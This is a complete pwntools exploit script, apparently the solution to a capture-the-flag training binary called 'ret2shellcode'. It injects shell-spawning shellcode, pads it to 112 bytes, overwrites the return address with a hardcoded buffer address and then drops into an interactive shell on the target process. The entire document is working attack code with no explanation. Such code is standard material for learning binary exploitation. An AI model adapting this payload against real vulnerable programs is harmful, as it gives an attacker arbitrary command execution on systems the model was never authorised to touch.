from pwn import *

sh = process('./ret2shellcode')
shellcode = asm(shellcraft.sh())
shellcode = shellcode.ljust(112, b'A')
buf2_addr = 0x804a080
sh.sendline(shellcode + p32(buf2_addr))
sh.interactive()